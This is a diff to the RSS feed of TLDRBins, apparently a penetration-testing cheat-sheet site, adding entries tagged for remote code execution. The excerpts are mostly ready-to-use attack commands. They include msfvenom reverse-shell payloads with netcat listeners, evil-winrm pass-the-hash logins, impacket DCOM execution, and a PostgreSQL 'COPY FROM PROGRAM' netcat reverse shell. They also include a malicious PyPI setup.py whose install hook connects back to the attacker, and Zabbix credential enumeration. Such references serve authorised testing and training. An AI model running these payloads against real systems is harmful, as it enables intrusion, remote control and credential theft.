@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Rce on TLDRBins</title>
+    <title>RCE on TLDRBins</title>
     <link>https://tldrbins.github.io/@rce/</link>
-    <description>Recent content in Rce on TLDRBins</description>
+    <description>Recent content in RCE on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@rce/index.xml" rel="self" type="application/rss+xml" />
@@ -13,6 +13,34 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
       <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -&amp;gt; Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ curl -u &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; http://&amp;lt;DOMAIN&amp;gt;:8080/manager/text/deploy?path=/revshell --upload-file revshell.</description>
+    </item>
+    <item>
+      <title>evil-winrm</title>
+      <link>https://tldrbins.github.io/evil-winrm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/evil-winrm/</guid>
+      <description>Connection Methods Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.conf&amp;#39; (All in uppercase) [libdefaults] default_realm = &amp;lt;DOMAIN&amp;gt; [realms] &amp;lt;DOMAIN&amp;gt; = { kdc = &amp;lt;DC&amp;gt;:88 admin_server = &amp;lt;DC&amp;gt; default_domain = &amp;lt;DOMAIN&amp;gt; } [domain_realm] .domain.internal = &amp;lt;DOMAIN&amp;gt; domain.internal = &amp;lt;DOMAIN&amp;gt; # Step 2: export .ccache export KRB5CCNAME=&amp;lt;CCACHE&amp;gt; # Step 3: Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DC&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.</description>
+    </item>
+    <item>
+      <title>ExecuteDCOM</title>
+      <link>https://tldrbins.github.io/executedcom/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/executedcom/</guid>
+      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
+    </item>
+    <item>
+      <title>Kubelet</title>
+      <link>https://tldrbins.github.io/kubelet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kubelet/</guid>
+      <description>Basic Commands # List all the pods on the node kubeletctl pods -s &amp;lt;TARGET&amp;gt; # List running pods kubeletctl runningpods -s &amp;lt;TARGET&amp;gt; # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s &amp;lt;TARGET&amp;gt; Ref: kubeletctl</description>
+    </item>
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
@@ -36,11 +64,25 @@
       <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; # User/Password brute force odat passwordguesser -s &amp;lt;TARGET&amp;gt; -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s &amp;lt;TARGET&amp;gt; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
     </item>
     <item>
+      <title>Postgresql</title>
+      <link>https://tldrbins.github.io/postgresql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/postgresql/</guid>
+      <description>Connect psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql &amp;#39;postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt;&amp;#39; Basic # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; &amp;amp;&amp;#39; </description>
+    </item>
+    <item>
       <title>Pypi</title>
       <link>https://tldrbins.github.io/pypi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pypi/</guid>
       <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@&amp;lt;DOMAIN&amp;gt;&amp;#34;, url=&amp;#34;http://&amp;lt;DOMAIN&amp;gt;&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
+    </item>
+    <item>
+      <title>Zabbix</title>
+      <link>https://tldrbins.github.io/zabbix/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/zabbix/</guid>
+      <description>Zabbix API General # Auth with cred curl &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:null, &amp;#34;params&amp;#34;:{&amp;#34;user&amp;#34;: &amp;#34;&amp;lt;USER&amp;gt;&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34;}}&amp;#39; # Get users curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;&amp;lt;AUTH&amp;gt;&amp;#34;, &amp;#34;params&amp;#34;:{&amp;#34;output&amp;#34;: &amp;#34;extend&amp;#34;}}&amp;#39; | jq . # Get hosts curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;host.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;&amp;lt;AUTH&amp;gt;&amp;#34;, &amp;#34;params&amp;#34;:{}}&amp;#39; | jq . # Get user group info curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.</description>
     </item>
   </channel>
 </rss>
